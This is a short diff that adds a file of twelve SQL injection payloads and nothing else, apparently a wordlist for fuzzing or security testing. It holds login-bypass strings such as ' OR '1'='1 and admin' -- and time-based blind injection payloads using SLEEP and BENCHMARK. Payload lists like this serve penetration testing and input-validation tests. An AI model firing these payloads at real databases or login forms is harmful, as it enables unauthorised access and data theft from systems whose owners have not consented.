@@ -1,0 +1,23 @@
+' OR '1'='1
+
+' OR '1'='1' --
+
+' OR 1=1#
+
+' OR 1=1--
+
+admin' --
+
+' OR 'a'='a
+
+1 OR SLEEP(5)#
+
+' OR SLEEP(5) --
+
+" OR SLEEP(5) --
+
+1); SLEEP(5); --
+
+1' AND IF(1=1, SLEEP(5), 0) --
+
+1' AND BENCHMARK(10000000, MD5(1)) --
